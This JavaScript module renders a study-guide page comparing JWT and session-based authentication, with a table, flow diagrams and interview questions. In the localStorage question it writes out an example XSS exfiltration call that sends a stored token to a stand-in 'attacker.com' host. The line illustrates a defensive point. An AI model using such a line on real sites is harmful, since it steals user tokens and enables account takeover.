/**
 * 3.1 Token-Based Authentication: JWT vs. Session-Based Authentication - Visual Guide
 * High-signal, visually stunning and faithful reproduction of Pages 36, 37, and 38
 * from The Modern System Design Interview Guide.
 */

export function renderJwtVsSessionContent(topic) {
  const authComparisonRows = [
    {
      dimension: "State Storage",
      session: "Server-side in centralized store (Redis / Memcached / DB)",
      jwt: "Client-side (Encoded in token; server is completely stateless)"
    },
    {
      dimension: "Verification Mechanism",
      session: "Database / cache key lookup on every incoming HTTP request",
      jwt: "Pure CPU mathematical cryptographic signature verification (0 DB lookups)"
    },
    {
      dimension: "Instant Revocation",
      session: "Trivial (Delete session key from Redis; user is instantly logged out)",
      jwt: "Difficult (Token remains valid across microservices until exp timestamp)"
    },
    {
      dimension: "Payload Size Overhead",
      session: "Tiny (~32 bytes for opaque session ID cookie)",
      jwt: "Large (500 bytes to 2 KB for Base64 header, claims, and signature)"
    },
    {
      dimension: "Horizontal Scalability",
      session: "Requires shared Redis cluster; cache becomes single point of failure",
      jwt: "Infinite scalability; any microservice validates token independently"
    },
    {
      dimension: "Cross-Domain & Mobile",
      session: "Challenging (Third-party cookie restrictions, CORS, mobile cookie handling)",
      jwt: "Native (Bearer token in standard Authorization header works across domains and mobile apps)"
    },
    {
      dimension: "Optimal Use Case",
      session: "Monolithic applications, online banking, immediate revocation mandatory",
      jwt: "Distributed microservices, mobile APIs, Single Sign-On (SSO), serverless architectures"
    }
  ];

  const interviewFollowUps = [
    {
      qNum: "Q1",
      question: "How does the Access Token + Refresh Token dual-token pattern solve the JWT security trade-off?",
      answer: `Stateless JWTs cannot be easily revoked before expiration. To balance security and performance, production systems issue two tokens: (1) A <strong>short-lived Access Token</strong> (e.g. 5–15 minutes) used in the <code>Authorization: Bearer</code> header for fast, stateless microservice access; and (2) A <strong>long-lived Refresh Token</strong> (e.g. 7–30 days) stored securely in a <code>HttpOnly; Secure; SameSite=Strict</code> cookie. When the access token expires, the client hits <code>/auth/refresh</code> to receive a new access token. If an account is compromised, the backend invalidates the refresh token record in Redis, revoking access within 15 minutes.`
    },
    {
      qNum: "Q2",
      question: "Why is storing JWTs in browser localStorage considered an antipattern for security-sensitive applications?",
      answer: `<code>localStorage</code> is accessible by <strong>any JavaScript code</strong> running on the same origin. If your application has a single Cross-Site Scripting (XSS) vulnerability (such as an unsanitized npm package or rich text input), an attacker can execute <code>fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt'))</code> and silently exfiltrate user credentials. <em>Production Best Practice:</em> Store access tokens in volatile JavaScript memory (variables) and keep refresh tokens inside an <code>HttpOnly</code> cookie, which browsers prevent JavaScript from reading.`
    },
    {
      qNum: "Q3",
      question: "What is the concrete difference between Symmetric (HS256) and Asymmetric (RS256 / ES256) JWT signing?",
      answer: `In <strong>HS256 (HMAC with SHA-256)</strong>, the authentication service and all consuming microservices share the <em>exact same secret key</em>. If an attacker compromises any downstream microservice, they gain the ability to forge valid tokens for the entire ecosystem. In <strong>RS256 / ES256 (RSA / ECDSA)</strong>, the auth service signs tokens with a <strong>private key</strong> kept secret, while all downstream microservices only need the <strong>public key</strong> to verify signatures. Microservices can never forge new tokens, enforcing zero-trust isolation.`
    },
    {
      qNum: "Q4",
      question: "In a microservice system using stateless JWTs, how do you handle immediate emergency user revocation?",
      answer: `Three complementary techniques: (1) <strong>Token Versioning:</strong> Include a <code>token_version: 3</code> claim in the JWT. The API Gateway or cache checks the user's current version; incrementing the version in Redis invalidates all existing user tokens globally; (2) <strong>Redis JTI Denylist:</strong> When a user logs out, store their unique <code>jti</code> (JWT ID) in Redis with a TTL equal to the token's remaining lifespan; and (3) <strong>Distributed Event Broadcast:</strong> Broadcast a <code>UserBanned</code> event over Kafka/Redis Pub/Sub to edge gateways to update in-memory blocklists immediately.`
    }
  ];

  return `
    <div class="flex flex-col gap-6 animate-fadeIn text-slate-200 select-text cursor-default">

      <!-- ================================================================= -->
      <!-- PAGES 36, 37, 38: JWT VS. SESSION AUTHENTICATION -->
      <!-- ================================================================= -->
      <div class="relative overflow-hidden rounded-2xl bg-[#0F172A] border border-[#24314A] shadow-2xl p-6 sm:p-8 flex flex-col gap-6">

        <!-- Top Part Banner -->
        <div class="flex items-center gap-2 text-[11px] font-code font-bold tracking-wider text-indigo-400 uppercase">
          <span>PART 3: SECURITY, AUTHENTICATION, AND ACCESS CONTROL</span>
        </div>

        <!-- Header: Purple Accent Bar + Title -->
        <div class="flex flex-col gap-2">
          <div class="flex items-center gap-3">
            <div class="w-1.5 h-7 bg-[#6366F1] rounded-sm shrink-0"></div>
            <h2 class="font-sans text-[22px] sm:text-[26px] font-bold text-white tracking-tight leading-snug">
              3.1 Token-Based Authentication: JWT vs. Session-Based Authentication
            </h2>
          </div>
        </div>

        <!-- Overview Text -->
        <div class="bg-[#141C2E] border border-[#24314A] rounded-xl p-4 sm:p-5 flex flex-col gap-3 font-sans text-[13px] leading-relaxed">
          <p class="text-slate-300">
            Authentication verifies the identity of a client making requests to distributed services. The architectural choice between stateful <strong>Session-Based Authentication</strong> and stateless <strong>JSON Web Token (JWT) Authentication</strong> fundamentally dictates database load, horizontal scalability, revocation latency, and security boundaries.
          </p>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-3.5 pt-1">
            <div class="bg-[#0F1626] border border-blue-500/30 rounded-lg p-3 flex flex-col gap-1.5">
              <div class="flex items-center justify-between">
                <span class="font-code text-[11px] font-bold text-blue-300 uppercase">Session-Based (Stateful)</span>
                <span class="text-[10px] font-code px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-300">Server State</span>
              </div>
              <p class="text-[12px] text-slate-300">
                Server generates an opaque session ID and stores user session data in Redis. Transmitted via <code>Set-Cookie</code>. Trivial instant revocation, but requires centralized cache lookups on every request.
              </p>
            </div>

            <div class="bg-[#0F1626] border border-emerald-500/30 rounded-lg p-3 flex flex-col gap-1.5">
              <div class="flex items-center justify-between">
                <span class="font-code text-[11px] font-bold text-emerald-300 uppercase">JWT-Based (Stateless)</span>
                <span class="text-[10px] font-code px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300">Client State</span>
              </div>
              <p class="text-[12px] text-slate-300">
                Server signs user identity claims using private key cryptography. Distributed microservices verify signatures offline with zero database hits. Near-infinite scalability, but difficult early revocation.
              </p>
            </div>
          </div>
        </div>

        <!-- ARCHITECTURAL FLOW COMPARISON DIAGRAM -->
        <div class="bg-[#0A0E1A] border border-[#24314A] rounded-xl p-5 sm:p-6 flex flex-col gap-4 font-mono text-[12px]">
          <div class="flex items-center justify-between pb-2 border-b border-[#24314A]/60">
            <span class="text-[11px] font-code font-bold tracking-wider text-cyan-400 uppercase">
              AUTHENTICATION ARCHITECTURE & DATABASE LOAD
            </span>
            <span class="text-[11px] font-code text-slate-500">Stateful Centralized vs. Stateless Distributed</span>
          </div>

          <div class="grid grid-cols-1 lg:grid-cols-2 gap-5">
            <!-- Session Architecture -->
            <div class="bg-[#0F1626] border border-blue-500/25 rounded-xl p-4 flex flex-col gap-2">
              <span class="font-code text-[11.5px] font-bold text-blue-300 uppercase">STATEFUL SESSION FLOW</span>
              <div class="text-[11px] text-slate-300 leading-relaxed whitespace-pre overflow-x-auto font-mono">
1. Client ──POST /login (creds)──► Auth Server
2. Auth Server ──Writes {user_id}──► [ Redis Session Store ]
3. Client ◄──Set-Cookie: session_id=xyz── Auth Server
4. Client ──GET /orders (Cookie: session_id)──► App Server
5. App Server ──Lookup session_id──► [ Redis Session Store ] (1 DB hit!)
              </div>
              <span class="text-[10.5px] text-slate-400 font-sans">▲ Every API request requires a network round-trip to Redis</span>
            </div>

            <!-- JWT Architecture -->
            <div class="bg-[#0F1626] border border-emerald-500/25 rounded-xl p-4 flex flex-col gap-2">
              <span class="font-code text-[11.5px] font-bold text-emerald-300 uppercase">STATELESS JWT FLOW</span>
              <div class="text-[11px] text-slate-300 leading-relaxed whitespace-pre overflow-x-auto font-mono">
1. Client ──POST /login (creds)──► Auth Server
2. Auth Server ──Signs claims with Private Key──► (No DB write!)
3. Client ◄──Returns JWT (Header.Payload.Signature)── Auth Server
4. Client ──GET /orders (Bearer JWT)──► Microservice A
5. Microservice A ──Verifies Signature with Public Key──► OK! (0 DB hits!)
              </div>
              <span class="text-[10.5px] text-emerald-300 font-sans">▲ Microservices authenticate offline in microseconds via pure math</span>
            </div>
          </div>
        </div>

        <!-- DIMENSIONAL COMPARISON TABLE -->
        <div class="flex flex-col gap-3">
          <span class="font-code text-[11px] font-bold text-slate-400 uppercase tracking-wider">
            STATEFUL SESSIONS VS. STATELESS JWT: DIMENSIONAL COMPARISON
          </span>

          <div class="overflow-x-auto rounded-xl border border-[#24314A]">
            <table class="w-full text-left border-collapse">
              <thead>
                <tr class="bg-[#1E1B4B] border-b border-[#312E81] text-[12px] font-code font-bold text-indigo-200">
                  <th class="p-3 w-40">Dimension</th>
                  <th class="p-3 text-blue-200">Session-Based (Stateful)</th>
                  <th class="p-3 text-emerald-200">Token-Based (JWT, Stateless)</th>
                </tr>
              </thead>
              <tbody class="divide-y divide-[#24314A]/60 font-sans text-[12.5px]">
                ${authComparisonRows.map((row, idx) => `
                  <tr class="hover:bg-[#141C2E]/70 transition-colors ${idx % 2 === 1 ? 'bg-[#0F1626]/40' : ''}">
                    <td class="p-3 font-semibold text-white font-code text-[11.5px]">${row.dimension}</td>
                    <td class="p-3 text-blue-200 leading-relaxed">${row.session}</td>
                    <td class="p-3 text-emerald-200 leading-relaxed">${row.jwt}</td>
                  </tr>
                `).join('')}
              </tbody>
            </table>
          </div>
        </div>

        <!-- Orange Callout: The JWT Revocation & Expiration Trap -->
        <div class="bg-amber-950/20 border-l-4 border-amber-500 rounded-r-xl p-5 flex flex-col gap-2">
          <span class="font-code text-[11px] font-bold text-amber-400 uppercase tracking-wider">
            THE JWT REVOCATION & EXPIRATION TRAP
          </span>
          <p class="text-[13px] text-slate-300 leading-relaxed font-sans">
            Because a JSON Web Token is cryptographically self-contained, <strong>it cannot be revoked until its <code>exp</code> timestamp lapses</strong>. If a user logs out, is banned, or their token is stolen, the token remains completely valid to any microservice verifying the signature! In system design interviews, describe the production solution: use <strong>15-minute short-lived Access Tokens</strong> paired with long-lived <strong>Refresh Tokens</strong> stored in Redis. For emergency revocations, implement a Redis-based <strong>Token Denylist (JTI blocklist)</strong> or an integer <strong>Token Version</strong> on the user record.
          </p>
        </div>

        <!-- Green Callout: Senior Perspective - Where to Store Tokens in Browser -->
        <div class="bg-emerald-950/20 border-l-4 border-emerald-500 rounded-r-xl p-5 flex flex-col gap-2">
          <span class="font-code text-[11px] font-bold text-emerald-400 uppercase tracking-wider">
            SENIOR PERSPECTIVE: WHERE TO STORE TOKENS IN THE BROWSER
          </span>
          <p class="text-[13px] text-slate-300 leading-relaxed font-sans">
            Never answer "store the JWT in <code>localStorage</code>" in a senior interview. <code>localStorage</code> is vulnerable to Cross-Site Scripting (XSS) attacks—any third-party script or injected dependency can exfiltrate the token. The secure, battle-tested architecture is:
          </p>
          <ul class="text-[12.5px] text-slate-300 font-sans flex flex-col gap-1.5 pt-1">
            <li>• <strong class="text-emerald-300 font-code">Access Token:</strong> Stored strictly in volatile JavaScript memory (closure variable), destroyed on page reload.</li>
            <li>• <strong class="text-emerald-300 font-code">Refresh Token:</strong> Stored in an <code>HttpOnly; Secure; SameSite=Strict</code> cookie, completely inaccessible to JavaScript, preventing both XSS exfiltration and Cross-Site Request Forgery (CSRF).</li>
          </ul>
        </div>

        <!-- Bar: OVER TO YOU -->
        <div class="bg-[#1E293B]/70 border border-[#334155] rounded-xl px-4 py-3 flex flex-col sm:flex-row sm:items-center gap-2.5 text-[12.5px]">
          <span class="px-2 py-0.5 rounded bg-indigo-500/20 text-indigo-300 border border-indigo-500/40 font-code text-[10.5px] font-bold uppercase tracking-wider shrink-0 w-fit">
            OVER TO YOU
          </span>
          <span class="text-slate-300 font-medium">
            In a distributed microservice architecture, how do you handle instantaneous user permission revocation with stateless JWTs?
          </span>
        </div>

        <!-- INTERVIEW FOLLOW-UPS Box -->
        <div class="bg-[#141C2E] border border-[#24314A] rounded-xl p-5 flex flex-col gap-4">
          <div class="flex items-center gap-2">
            <span class="font-code text-[11px] font-bold text-[#818CF8] uppercase tracking-wider">
              INTERVIEW FOLLOW-UPS
            </span>
          </div>

          <div class="flex flex-col gap-4">
            ${interviewFollowUps.map(item => `
              <div class="flex flex-col gap-1.5 pb-3 border-b border-[#24314A]/50 last:border-0 last:pb-0">
                <div class="flex items-start gap-2.5">
                  <span class="font-code text-[12px] font-bold text-[#818CF8] shrink-0 pt-0.5">${item.qNum}</span>
                  <span class="text-[13.5px] font-bold text-white font-sans">${item.question}</span>
                </div>
                <p class="text-[13px] text-slate-300 leading-relaxed font-sans pl-6">
                  ${item.answer}
                </p>
              </div>
            `).join('')}
          </div>
        </div>

        <!-- Dark Blue Callout Box: KEY INTERVIEW TAKEAWAY -->
        <div class="bg-gradient-to-r from-[#1E1B4B] to-[#312E81] border border-[#4338CA] rounded-xl p-5 flex flex-col gap-2 shadow-lg shadow-indigo-950/40">
          <span class="font-code text-[11px] font-bold text-cyan-300 uppercase tracking-wider flex items-center gap-1.5">
            <span class="material-symbols-outlined text-[15px]">key</span>
            KEY INTERVIEW TAKEAWAY
          </span>
          <p class="text-[13.5px] font-sans font-medium text-white leading-relaxed">
            Sessions trade horizontal scalability and cross-domain flexibility for instant server-side revocation. Stateless JWTs trade instant revocation for zero-database verification across thousands of microservices. In modern production systems, always propose the hybrid model: 15-minute access tokens validated offline + revokable refresh tokens in HttpOnly cookies.
          </p>
        </div>

        <!-- Page 38 Footer -->
        <div class="pt-4 border-t border-[#24314A]/70 flex items-center justify-between text-[11px] font-code text-slate-500">
          <span>The Modern System Design Interview Guide</span>
          <span>Page 38</span>
        </div>

      </div>

    </div>
  `;
}
